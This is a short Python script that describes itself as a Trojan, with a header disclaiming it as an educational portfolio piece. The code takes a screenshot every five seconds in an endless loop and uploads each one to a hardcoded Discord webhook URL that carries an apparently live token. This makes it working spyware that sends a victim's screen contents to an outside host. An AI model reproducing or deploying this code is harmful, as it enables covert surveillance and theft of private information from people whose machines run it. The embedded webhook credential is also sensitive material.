'''
Author: Aayan Ahmad Khan
Date: 01/03/2025
Description: A Trojan that steals data and sends the infos to Discord.

PLEASE USE FOR EDUCATIONAL PUROPSES I ONLY MADE THIS FOR MY PORTFOLIO!
'''

import pyautogui
import time
import requests
import schedule

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1345419208124665968/7h3vDB5XwFndy6JXzR3EVQM7vVYqo3HqllykZrfrRi6_tGLtw-uTWBcS32eMWE6n90_m"

def screenshot_and_send():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

    with open("screenshot.png", "rb") as file:
        response = requests.post(DISCORD_WEBHOOK_URL, files={"file": file})

    if response.status_code == 200 or response.status_code == 204:
        print("Screenshot sent successfully!")
    else:
        print(f"Failed to send screenshot: {response.status_code}")

schedule.every(5).seconds.do(screenshot_and_send)

while True:
    schedule.run_pending()
    time.sleep(1)